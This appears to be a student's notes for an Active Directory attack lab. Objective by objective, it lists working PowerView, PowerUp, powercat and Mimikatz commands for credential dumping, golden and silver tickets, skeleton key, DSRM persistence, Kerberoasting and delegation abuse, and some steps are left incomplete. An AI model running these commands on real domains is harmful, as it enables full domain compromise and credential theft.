FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{C4F31C31-6258-4991-AAAD-454934E882
                 AE}\Machine\Scripts
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 10:55:01 PM
LastWriteTime  : 2/18/2019 10:55:01 PM
CreationTime   : 2/18/2019 10:55:01 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{C4F31C31-6258-4991-AAAD-454934E882
                 AE}\Machine\Scripts\Shutdown
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 10:55:01 PM
LastWriteTime  : 2/18/2019 10:55:01 PM
CreationTime   : 2/18/2019 10:55:01 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{C4F31C31-6258-4991-AAAD-454934E882
                 AE}\Machine\Scripts\Startup
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 10:55:01 PM
LastWriteTime  : 2/18/2019 10:55:01 PM
CreationTime   : 2/18/2019 10:55:01 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{C4F31C31-6258-4991-AAAD-454934E882
                 AE}\Machine\comment.cmtx
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 10:55:58 PM
LastWriteTime  : 2/18/2019 11:09:17 PM
CreationTime   : 2/18/2019 10:55:58 PM
Length         : 557

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{C4F31C31-6258-4991-AAAD-454934E882
                 AE}\Machine\Registry.pol
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 11:09:17 PM
LastWriteTime  : 2/18/2019 11:09:17 PM
CreationTime   : 2/18/2019 11:09:08 PM
Length         : 2278

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{C4F31C31-6258-4991-AAAD-454934E882
                 AE}\User
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 10:53:55 PM
LastWriteTime  : 2/18/2019 10:53:55 PM
CreationTime   : 2/18/2019 10:53:55 PM
Length         : 

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies\{C4F31C31-6258-4991-AAAD-454934E882
                 AE}\GPT.INI
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 10:53:55 PM
LastWriteTime  : 4/19/2019 11:21:47 PM
CreationTime   : 2/18/2019 10:53:55 PM
Length         : 60

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\scripts
Owner          : BUILTIN\Administrators
LastAccessTime : 2/16/2019 11:00:05 PM
LastWriteTime  : 2/16/2019 11:00:05 PM
CreationTime   : 2/16/2019 11:00:05 PM
Length         : 

```

```powershell
PS C:\AD\Tools> Invoke-ShareFinder | Out-File -FilePath .\Domain_Shares.txt
Find shares on hosts in current domain
PS C:\Users\student26> Invoke-ShareFinder -ExcludeStandard -ExcludeIPC -ExcludePrint
\\dcorp-dc.dollarcorp.moneycorp.local\NETLOGON  - Logon server share
\\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL    - Logon server share
\\dcorp-student30.dollarcorp.moneycorp.local\shared     -
\\dcorp-student25.dollarcorp.moneycorp.local\shared     -
\\dcorp-student28.dollarcorp.moneycorp.local\shared     -
\\dcorp-student29.dollarcorp.moneycorp.local\shared     -
\\dcorp-student26.dollarcorp.moneycorp.local\shared     -
\\dcorp-student31.dollarcorp.moneycorp.local\shared     -
\\dcorp-student23.dollarcorp.moneycorp.local\shared     -
\\dcorp-student34.dollarcorp.moneycorp.local\shared     -
\\dcorp-student27.dollarcorp.moneycorp.local\shared     -
\\dcorp-student32.dollarcorp.moneycorp.local\shared     -
\\dcorp-student33.dollarcorp.moneycorp.local\shared     -
\\dcorp-student24.dollarcorp.moneycorp.local\shared     -
```

```powershell
Get all fileservers of the domain
PS C:\AD\Tools> Get-NetFileServer
```


## Learning Objective No. 2: Display name of the GPO applied on StudentMachines OU

```powershell
PS C:\AD\Tools> Get-NetGPO -ComputerName dcorp-student26.dollarcorp.moneycorp.local


usncreated               : 65831
displayname              : Students
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00
                           C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 4/20/2019 6:22:16 AM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 123144
dscorepropagationdata    : {5/3/2020 9:04:05 AM, 2/21/2019 12:17:00 PM, 2/19/2019 1:04:02 PM, 2/19/2019 12:55:49 PM...}
name                     : {3E04167E-C2B6-4A9A-8FB7-C811158DC97C}
adspath                  : LDAP://CN={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
flags                    : 0
cn                       : {3E04167E-C2B6-4A9A-8FB7-C811158DC97C}
gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{3E04167E-C2B6-4A9A-8FB7-C811158DC
                           97C}
distinguishedname        : CN={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 2/19/2019 7:04:25 AM
versionnumber            : 8
instancetype             : 4
objectguid               : 8ecdfe44-b617-4b9e-a9f9-4d548e5dc7b1
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
ComputerName             : dcorp-student26.dollarcorp.moneycorp.local
```

```powershell
List all the OUs
PS C:\AD\Tools> Get-NetOU -DomainController dcorp-dc -FullData | select name,gplink

name               gplink
----               ------
Domain Controllers [LDAP://CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local;0]
Applocked          [LDAP://cn={211A25B2-03AD-4E5E-9C6A-AFEFE66EFB2D},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]
Servers            [LDAP://cn={C4F31C31-6258-4991-AAAD-454934E882AE},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]
StudentMachines    [LDAP://cn={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]
```

```powershell
List all the computers in the StudentMachines OU. (Active Directory Module)
PS C:\AD\Tools\ADModule-master> Get-ADComputer -Filter * -SearchBase "OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local" | Select
-object DistinguishedName,DNSHostName,Name

DistinguishedName                                                         DNSHostName                                Name
-----------------                                                         -----------                                ----
CN=DCORP-STDADM,OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local    dcorp-stdadm.dollarcorp.moneycorp.local    DCORP-STDADM
CN=DCORP-STUDENT23,OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local dcorp-student23.dollarcorp.moneycorp.local DCORP-STUDENT23
CN=DCORP-STUDENT24,OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local dcorp-student24.dollarcorp.moneycorp.local DCORP-STUDENT24
CN=DCORP-STUDENT25,OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local dcorp-student25.dollarcorp.moneycorp.local DCORP-STUDENT25
CN=DCORP-STUDENT26,OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local dcorp-student26.dollarcorp.moneycorp.local DCORP-STUDENT26
CN=DCORP-STUDENT28,OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local dcorp-student28.dollarcorp.moneycorp.local DCORP-STUDENT28
CN=DCORP-STUDENT29,OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local dcorp-student29.dollarcorp.moneycorp.local DCORP-STUDENT29
CN=DCORP-STUDENT30,OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local dcorp-student30.dollarcorp.moneycorp.local DCORP-STUDENT30
CN=DCORP-STUDENT31,OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local dcorp-student31.dollarcorp.moneycorp.local DCORP-STUDENT31
CN=DCORP-STUDENT32,OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local dcorp-student32.dollarcorp.moneycorp.local DCORP-STUDENT32
CN=DCORP-STUDENT33,OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local dcorp-student33.dollarcorp.moneycorp.local DCORP-STUDENT33
CN=DCORP-STUDENT34,OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local dcorp-student34.dollarcorp.moneycorp.local DCORP-STUDENT34
CN=DCORP-STUDENT27,OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local dcorp-student27.dollarcorp.moneycorp.local DCORP-STUDENT27


PS C:\Users\student26> Get-NetOU -OUName StudentMachines | %{Get-NetComputer -ADSpath $_} (PowerView)
dcorp-stdadm.dollarcorp.moneycorp.local
dcorp-student23.dollarcorp.moneycorp.local
dcorp-student24.dollarcorp.moneycorp.local
dcorp-student25.dollarcorp.moneycorp.local
dcorp-student26.dollarcorp.moneycorp.local
dcorp-student28.dollarcorp.moneycorp.local
dcorp-student29.dollarcorp.moneycorp.local
dcorp-student30.dollarcorp.moneycorp.local
dcorp-student31.dollarcorp.moneycorp.local
dcorp-student32.dollarcorp.moneycorp.local
dcorp-student33.dollarcorp.moneycorp.local
dcorp-student34.dollarcorp.moneycorp.local
dcorp-student27.dollarcorp.moneycorp.local
PS C:\Users\student26> Get-NetOU -OUName StudentMachines
```

```
 List the GPOs
 PS C:\AD\Tools> Get-NetGPO -DomainController dcorp-dc.dollarcorp.moneycorp.local | select displayname

displayname
-----------
Default Domain Policy
Default Domain Controllers Policy
Applocker
Servers
Students
```

```powershell
Enumerate GPO applied on the StudentMachines OU.
PS C:\AD\Tools> Get-NetGPO -GPOname "{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}"


usncreated               : 65831
displayname              : Students
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00
                           C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 4/20/2019 6:22:16 AM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 123144
dscorepropagationdata    : {5/3/2020 9:04:05 AM, 2/21/2019 12:17:00 PM, 2/19/2019 1:04:02 PM, 2/19/2019 12:55:49 PM...}
name                     : {3E04167E-C2B6-4A9A-8FB7-C811158DC97C}
adspath                  : LDAP://CN={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
flags                    : 0
cn                       : {3E04167E-C2B6-4A9A-8FB7-C811158DC97C}
gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{3E04167E-C2B6-4A9A-8FB7-C811158DC
                           97C}
distinguishedname        : CN={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 2/19/2019 7:04:25 AM
versionnumber            : 8
instancetype             : 4
objectguid               : 8ecdfe44-b617-4b9e-a9f9-4d548e5dc7b1
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local

```

## Learning Objective No. 3: ActiveDirectory Rights for RDPUsers group on the users named ControlxUser

```powershell
Invoke-ACLScanner -ResolveGUIDs
```

```powershell
ACL for the Users group 
Get-ObjectAcl -SamAccountName student1 –ResolveGUIDs 
```

```powershell
ACL for the Domain Admins group 
Get-ObjectAcl -SamAccountName "Domain Admins" –ResolveGUIDs 
```

```powershell
All modify rights/permissions for the studentx
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "student26"}+  # filter
```

## Learning Objective No. 4: Trust Direction for the trust between dollarcorp.moneycorp.local and eurocorp.local	


```powershell
Enumerate all domains in the moneycorp.local forest. 
PS C:\Users\student26> Get-NetForestDomain –Forest moneycorp.local | select name
```

```powershell
Map the trusts of the dollarcorp.moneycorp.local domain.
PS C:\Users\student26> Get-NetDomainTrust –Domain dollarcorp.moneycorp.local
```

```powershell
Map External trusts in moneycorp.local forest. 
PS C:\Users\student26> Get-NetDomainTrust –Domain moneycorp.local
```
```powershell
Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest.
PS C:\Users\student26> Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq "External"}
```



## Learning Objective No. 5: Service abused on the student VM for local privilege escalation

```powershell
Exploit a service on dcorp-studentx and elevate privileges to local 
administrator. 
PS C:\Users\student26> . C:\AD\Tools\PowerUp.ps1
PS C:\Users\student26> Invoke-AllChecks -Verbose
PS C:\Users\student26> Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student26' # added to localgroup Administrator
```

```powershell
Identify a machine in the domain where student26 has local administrative access.
PS C:\Users\student26\Desktop> Find-LocalAdminAccess
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-student26.dollarcorp.moneycorp.local
```


**Make sure to turn off the firewall of your attackers machine to be able to download the reverse shell.**
```powershell
Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server.
PS C:\Users\student26> . C:\AD\Tools\powercat.ps1
PS C:\Users\student26> powercat -l -v -p 443 -t 1000

```


## Learning Objective No. 7	: Process using svcadmin as service account

```powershell
Domain user on one of the machines has access to a server where a domain admin is logged in. Identify:
– The domain user: dcorp\ciadmin
– The server where the domain admin is logged in: dcorp-mgmt
PS C:\Program Files (x86)\Jenkins\workspace\Project9> Invoke-UserHunter -CheckAccess

Escalate privileges to Domain Admin
– Using the method above.
PS C:\Windows\system32> Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'

– Using derivative local admin

Through dcorp-srvadmin, we enumerate policies by looking at the applocaker, we found out that we can drop a powershell script or any binary on ProgramFiles and execute the script in this case, PowerView.ps1, we use Invoke-UserHunter to determine where we have a local admin access and use the Invoke-Mimikatz -Dumpcreds to dump 
```

## Learning Objective No. 8 : Dump hashes on the domain controller of dollarcorp.moneycorp.local.

```powershell
[dcorp-dc]: PS C:\Users\svcadmin\Documents> Invoke-Mimikatz -Command '"lsadump::lsa /patch"' –Computername dcorp-dc
```

```powershell
Using the NTLM hash of krbtgt account, create a Golden ticket. 
PS C:\Users\student26> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

```powershell
Use the Golden ticket to (once again) get domain admin privileges from 
a machine.

PS C:\Users\student26> ls \\dcorp-dc\c$

PS C:\Users\student26> gwmi -class win32_operatingsystem -ComputerName dcorp-dc
```

Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

## Learning Objective No. 9 : 

Try to get command execution on the domain controller by creating 
silver ticket for:

**Note: Get the hash of the domain controller e.g. dcorp-dc.dollarcorp.moneycorp.local and put it on the rc4**

– HOST service

```powershell
PS C:\Users\student26> Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:bb3627f512f5691f329e75cfcc6fbaa3 /user:Administrator /ptt"'
```

– WMI

```powershell
PS C:\Users\student26> Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:bb3627f512f5691f329e75cfcc6fbaa3 /user:Administrator /ptt"'
```

## Learning Objective No. 10: 

Use Domain Admin privileges obtained earlier to execute the Skeleton 
Key attack.

**Note: Use the below command to inject a skeleton key (password would be mimikatz) on a Domain Controller of choice. DA privileges required**

```powershell
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

## Learning Objective No. 11:

Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence.

Dump DSRM password (needs DA privs)

```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dcorp-dc
Enter-PSSession -Computername dcorp-dc
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

## Learning Objective No. 12:

Check if studentx has Replication (DCSync) rights. (Normal Shell)

```powershell
PS C:\Users\student26> Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'student26'}
```

If yes, execute the DCSync attack to pull hashes of the krbtgt user. If no, add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user. (Need DA shell)

```powershell
PS C:\Windows\system32> Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccount
```

## Learning Objective No. 14:

Using the Kerberoast attack, crack password of a SQL server service account. 

Find user accounts used as Service accounts:

• PowerView

```powershell
PS C:\Users\student26> Get-NetUser –SPN
```

• ActiveDirectory module

```powershell
PS C:\Users\student26> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

• Request a TGS

```powershell
PS C:\Users\student26> Add-Type -AssemblyName System.IdentityModel
PS C:\Users\student26> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
```

• Request-SPNTicket from PowerView can be used as well for cracking with John or Hashcat

```powershell
PS C:\Users\student26>  Request-SPNTicket -SPN "Vpn26user"
```

• Check if the TGS has been granted

```powershell
PS C:\Users\student26> klist
```
• Export all tickets using Mimikatz

```powershell
PS C:\Users\student26> Invoke-Mimikatz -Command '"kerberos::list /export"'
```

• Crack the Service account password

```powershell
PS C:\Users\student26> python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-
40a10000-student1@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```

## Learning Objective 15:

• Enumerate users that have Kerberos Preauth disabled. 

• Using PowerView (dev):

```powershell
PS C:\Users\student26> Get-DomainUser -PreauthNotRequired -Verbose
```

• Using ActiveDirectory module:

```powershell
PS C:\Users\student26> Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```

Edit user to force disable Kerberos Preauth

```powershell
PS C:\Users\student26> Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} –Verbose
```

• Determine if studentx has permissions to set UserAccountControl flags 
for any user. 

```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```
• If yes, disable Kerberos Preauth on such a user and obtain encrypted 
part of AS-REP.

• Obtain the encrypted part of AS-REP for such an account. 
• Request encrypted AS-REP for offline brute-force.
• Let's use ASREPRoast

```powershell
PS C:\Users\student26> Get-ASREPHash -UserName VPN1user -Verbose
```
• To enumerate all users with Kerberos preauth disabled and request a 
hash

```powershell
PS C:\Users\student26> Invoke-ASREPRoast -Verbose
```

## Learning Objective 16: Force SPN

• Determine if studentx has permissions to set UserAccountControl flags 
for any user. 

```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

• If yes, force set a SPN on the user and obtain a TGS for the user.

```powershell
PS C:\Users\student26> Get-DomainUser -Identity support26user | select serviceprincipalname
PS C:\Users\student26> Set-DomainObject -Identity support26user -Set @{serviceprincipalname='ops/whatever1'}
PS C:\AD\Tools\kerberoast\powerview-kerberoast> Add-Type -AssemblyNAme System.IdentityModel
PS C:\AD\Tools\kerberoast\powerview-kerberoast> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/whatever1"
PS C:\AD\Tools\kerberoast\powerview-kerberoast> Invoke-Mimikatz -Command '"kerberos::list /export"'
PS C:\AD\Tools\kerberoast\powerview-kerberoast> python ..\tgsrepcrack.py ..\10k-worst-pass.txt .\3-40a10000-student26@ops~whatever1-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```

## Learning Objective 17: 

• Find a server in dcorp domain where Unconstrained Delegation is 
enabled. 

```powershell
PS C:\Users\student26> Get-NetComputer -UnConstrained
```
• Access that server, wait for a Domain Admin to connect to that server 
and get Domain Admin privileges. 

• We must trick or wait for a domain admin to connect a service on 
appsrv.

• Now, if the command is run again:

```powershell
[dcorp-appsrv]: PS C:\Users\appadmin\Documents\student26> Invoke-Mimikatz –Command '"sekurlsa::tickets /export"'
```
• The DA token could be reused:

```powershell
[dcorp-appsrv]: PS C:\Users\appadmin\Documents\student26> Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgtDOLLARCORP.MONEYCORP.LOCAL.kirbi"'
```

## Learning Objective 18: 

• Enumerate users in the domain for whom Constrained Delegation is 
enabled. 

• Using PowerView (dev)

```powershell
PS C:\Users\student26> . C:\AD\Tools\PowerView_dev.ps1
PS C:\Users\student26> Get-DomainUser –TrustedToAuth
PS C:\Users\student26> 
```
• Using ActiveDirectory module:
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo

– For such a user, request a TGT from the DC and obtain a TGS for the service to 

```powershell
```
which delegation is configured. 
– Pass the ticket and access the service as DA. 
• Enumerate computer accounts in the domain for which Constrained 
Delegation is enabled. 
– For such a user, request a TGT from the DC.
– Use the TGS for executing the DCSync attack. 